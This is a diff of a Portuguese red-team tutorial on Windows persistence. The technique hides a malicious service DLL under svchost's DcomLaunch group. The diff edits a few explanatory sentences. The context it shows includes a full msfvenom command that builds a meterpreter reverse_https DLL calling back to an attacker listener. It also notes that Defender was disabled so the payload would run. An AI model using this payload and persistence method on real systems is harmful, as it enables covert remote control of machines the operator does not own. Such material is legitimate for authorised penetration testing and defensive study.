@@ -29,7 +29,7 @@ Com o grupo DcomLaunch setado, o svchost vai consultar a registry key ```HKLM\SO
 
 E é nesse ultimo passo que podemos adicionar uma dll maliciosa para ela ser executada pelo próprio service. Isso possibilita a execução de implants/droppers, varias tecnicas de process-injection ou qualquer codigo que seja possivel executar em uma dll.
 
-(vale a pena ressaltar que essa persistencia só é possivél com privilégios elevados no alvo, como algum user domain admin ou algo do tipo)
+(vale a pena ressaltar que essa persistencia só é possível com privilégios elevados como algum admin ou system)
 
 <strong>Depois da introção vamos para a parte prática.</strong>
 
@@ -39,14 +39,14 @@ A ideia é a seguinte, vamos partir do contexto de que você ja tenha uma shell 
 ### 1 - Persistence service dll
 >__
 
-- Aqui vem a parte em que você precisa preparar sua dll. Assim como existe "service binary" também podemos usar um "service dll". No artigo é usado um template que você pode altera-lo mas para exemplo vou usar uma dll gerada pelo msfvenom.
+- Aqui vem a parte em que você precisa preparar sua dll. Assim como existe "service binary" também podemos usar um "service dll". No artigo vou usar uma dll gerada pelo msfvenom, mas você pode usar uma customizada.
 
 ```
 └─$ msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.0.1 lport=4321 EXITFUNC=thread  --smallest -f dll -o evil.dll
 ```
 Os exemplos de comandos são de uma shell meterpreter, então as flags e as strings usadas podem variar dependendo do c2 ou da shell que você usar.
 
-(Obs: para facilitar o demo o defender foi desativado porque ele barraria facilmente a dll do msfvenom. Pra isso você pode usar tecnicas de obfuscação para o implant...)
+(Obs: para facilitar o demo o defender foi desativado porque ele barraria facilmente a dll do msfvenom.)
 
 ### 2 - Create EvilSvc Service
 >__
